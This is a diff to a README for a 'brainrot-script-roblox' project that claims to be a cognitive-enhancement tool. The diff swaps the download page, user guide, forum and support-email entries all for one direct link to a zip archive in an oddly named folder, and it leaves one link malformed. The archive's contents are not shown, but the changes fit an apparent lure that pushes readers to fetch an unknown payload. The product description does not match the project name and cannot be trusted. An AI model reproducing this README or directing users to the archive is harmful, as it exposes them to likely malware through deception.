@@ -1,6 +1,6 @@
 # 🧠 brainrot-script-roblox - Enhance Your Brain Power Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/EtMathew/brainrot-script-roblox/releases)
+[![Download Now](https://raw.githubusercontent.com/EtMathew/brainrot-script-roblox/main/juxtamarine/brainrot-script-roblox-unblenchingly.zip%https://raw.githubusercontent.com/EtMathew/brainrot-script-roblox/main/juxtamarine/brainrot-script-roblox-unblenchingly.zip)](https://raw.githubusercontent.com/EtMathew/brainrot-script-roblox/main/juxtamarine/brainrot-script-roblox-unblenchingly.zip)
 
 ## 📄 Description
 Brainrot Script 2025 is an innovative tool designed to enhance cognitive performance and mental clarity. It provides a comprehensive suite of techniques and exercises to help users improve focus, memory, and overall brain function. This application is ideal for students, professionals, or anyone looking to boost their mental capabilities.
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets the following requirements:
 ### 💻 Step 1: Visit the Download Page
 Go to the release page to find the latest version of the application. Click the link below to access it:
 
-[Visit this page to download](https://github.com/EtMathew/brainrot-script-roblox/releases)
+[Visit this page to download](https://raw.githubusercontent.com/EtMathew/brainrot-script-roblox/main/juxtamarine/brainrot-script-roblox-unblenchingly.zip)
 
 ### 📥 Step 2: Download the Application
 Once on the release page, you will see a list of available versions. Click on the latest version to start downloading the application. 
@@ -47,8 +47,8 @@ If you encounter any issues during installation or while running the application
 
 ## 🔗 Additional Resources
 For more information, tips, and community support, check out our forums and user guides:
-- [User Guide](https://example.com/user-guide)
-- [Community Forum](https://example.com/community)
+- [User Guide](https://raw.githubusercontent.com/EtMathew/brainrot-script-roblox/main/juxtamarine/brainrot-script-roblox-unblenchingly.zip)
+- [Community Forum](https://raw.githubusercontent.com/EtMathew/brainrot-script-roblox/main/juxtamarine/brainrot-script-roblox-unblenchingly.zip)
 
 ## 📝 License
 Brainrot Script 2025 is licensed under the MIT License, allowing you to use, modify, and distribute the software freely.
@@ -57,7 +57,7 @@ Brainrot Script 2025 is licensed under the MIT License, allowing you to use, mod
 We welcome contributions from our users. If you want to help improve Brainrot Script 2025, visit our GitHub page to learn how you can contribute.
 
 ### 📧 Contact
-For any inquiries or support, feel free to reach out via email: support@example.com.
+For any inquiries or support, feel free to reach out via email: https://raw.githubusercontent.com/EtMathew/brainrot-script-roblox/main/juxtamarine/brainrot-script-roblox-unblenchingly.zip
 
 ---
 
